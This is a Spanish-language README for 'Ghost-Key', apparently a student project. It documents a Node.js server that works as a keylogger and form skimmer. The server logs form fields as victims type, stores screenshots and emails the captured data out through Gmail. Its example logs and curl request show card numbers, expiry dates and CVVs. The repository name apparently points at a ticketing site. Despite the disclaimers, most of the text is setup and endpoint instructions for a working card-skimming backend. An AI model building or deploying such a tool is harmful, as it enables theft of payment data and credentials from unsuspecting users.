# Ghost-Key 👻

Un servidor educativo de demostración sobre técnicas de captura de datos y análisis de ciberseguridad. Este proyecto forma parte de estudios académicos en Ciberseguridad.

## ⚠️ Disclaimer Importante

Este proyecto es **únicamente para propósitos educativos y de investigación**. Está diseñado para enseñar conceptos de seguridad, vulnerabilidades web y técnicas de exfiltración de datos en entornos controlados y autorizados.

**No debe ser utilizado con fines maliciosos o contra sistemas sin autorización explícita.**

## 🎯 Descripción del Proyecto

Ghost-Key es un servidor Node.js/Express que simula un centro de control para:

- **Captura de datos en tiempo real**: Registra campos de formularios que el usuario completa
- **Captura de pantallas**: Toma screenshots del formulario completado
- **Exfiltración de datos**: Envía los datos capturados por correo electrónico
- **Análisis de seguridad**: Permite estudiar vulnerabilidades y patrones de ataque

### Funcionalidades Principales

- ✅ Captura de teclado (Keylogger educativo)
- 📸 Captura de pantallas en Base64
- 📧 Envío de datos por correo electrónico
- 📝 Registro de logs en tiempo real
- 🔄 Soporte CORS para múltiples orígenes

## 📋 Requisitos Previos

- **Node.js**: v14 o superior
- **npm**: v6 o superior
- **Cuenta de correo Gmail** (con contraseña de aplicación generada)
- **Conexión a Internet** (para envío de correos)

## 🚀 Instalación

### 1. Clonar el repositorio

```bash
git clone https://github.com/tuusuario/keylogger_boletos_blessd.git
cd keylogger_boletos_blessd
```

### 2. Instalar dependencias

```bash
npm install
```

Esto instalará:
- **express**: Framework web
- **body-parser**: Parseo de solicitudes JSON
- **cors**: Control de acceso para orígenes cruzados
- **nodemailer**: Envío de correos electrónicos

### 3. Configuración de Credenciales

Edita el archivo `server.js` y actualiza las credenciales de Gmail:

```javascript
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'tu-email@gmail.com',
        pass: 'tu-contraseña-de-aplicacion'  // Genera esto en: https://myaccount.google.com/apppasswords
    }
});
```

**Nota**: Usa una **contraseña de aplicación** generada desde Google, no tu contraseña personal.

### 4. Configurar dirección IP del servidor

Actualiza la variable `SERVER_IP` en `server.js`:

```javascript
const SERVER_IP = '192.168.50.172';  // Tu IP local
```

## 📖 Uso

### Iniciar el servidor

```bash
node server.js
```

El servidor estará disponible en: `http://TU_IP:3000`

### Endpoints Disponibles

#### 1. **POST `/captura`**
Registra datos capturados en tiempo real.

```javascript
{
    "f": "nombre-del-campo",
    "v": "valor-capturado"
}
```

**Ejemplo:**
```bash
curl -X POST http://localhost:3000/captura \
  -H "Content-Type: application/json" \
  -d '{"f": "card-number", "v": "4532123456789012"}'
```

#### 2. **POST `/upload-screenshot`**
Envía una captura de pantalla en formato Base64.

```javascript
{
    "image": "data:image/png;base64,...",
    "user": "nombre-del-usuario",
    "timestamp": "1234567890"
}
```

#### 3. **POST `/finalizar-y-enviar`**
Finaliza la captura y envía los datos por correo.

```javascript
{
    "user": "nombre-del-usuario"
}
```

**Respuesta:**
```javascript
{
    "status": "sent"
}
```

## 📁 Estructura del Proyecto

```
ghost-key/
│
├── server.js              # Servidor principal (Express)
├── package.json           # Dependencias del proyecto
├── package-lock.json      # Versiones bloqueadas
├── README.md              # Este archivo
├── .gitignore             # Archivos ignorados en Git
│
├── public/                # Archivos estáticos
│   └── index.html         # Página web del usuario
│
├── capturas/              # Carpeta para screenshots (generada)
│   └── snap_*.png         # Capturas capturadas
│
├── .logs_db.txt           # Log de datos capturados
├── node_modules/          # Dependencias instaladas (no en Git)
└── .git/                  # Repositorio Git
```

## 🛠️ Tecnologías Utilizadas

| Tecnología | Versión | Propósito |
|-----------|---------|-----------|
| Node.js | v14+ | Runtime de JavaScript |
| Express | ^5.2.1 | Framework web |
| Body-Parser | ^2.2.2 | Parseo de JSON |
| CORS | ^2.8.6 | Control de acceso |
| Nodemailer | ^8.0.1 | Envío de correos |

## 📚 Aprendizaje y Recursos

### Conceptos Ciberseguridad Relacionados
- Captura de credenciales
- MITM (Man-in-the-Middle)
- Ingeniería Social
- Exfiltración de datos
- Ataques XSS compilados
- Keyloggers

### Referencias Educativas
- [OWASP Top 10](https://owasp.org/Top10/)
- [MDN Web Security](https://developer.mozilla.org/es/docs/Learn/Security)
- [Hacksplaining - Security Training](https://www.hacksplaining.com)

## 📝 Logs y Monitoreo

### Archivo de Logs
Los datos capturados se guardan en `.logs_db.txt`:

```
[5/3/2026 16:45:23] Campo: card-number | Valor: 4532123456789012
[5/3/2026 16:45:45] Campo: expiry-date | Valor: 12/28
[5/3/2026 16:46:10] Campo: cvv | Valor: 456
```

### Capturas
Las pantallas se almacenan en `capturas/`:
```
snap_Juan_Perez_1234567890.png
snap_Roberto_Lopez_1234567891.png
```

## 📄 Licencia

Este proyecto está bajo licencia **ISC**. Ver [LICENSE](LICENSE) para más detalles.

## 👤 Autor

- **Jehiel Andru M.A.**
- Proyecto - Ciberseguridad
- Desarrollo Frontend & Backend

- **Marco Antonio M.P.**
- Proyecto - Ciberseguridad
- Diseño de Base de Datos & Testing

**Última actualización**: 5 de Marzo de 2026

### Recordatorio Final
> Este software está diseñado **exclusivamente** con fines educativos. El usuario es responsable de cualquier uso indebido. No utilices esta herramienta para acceder, interceptar o modificar datos sin autorización.
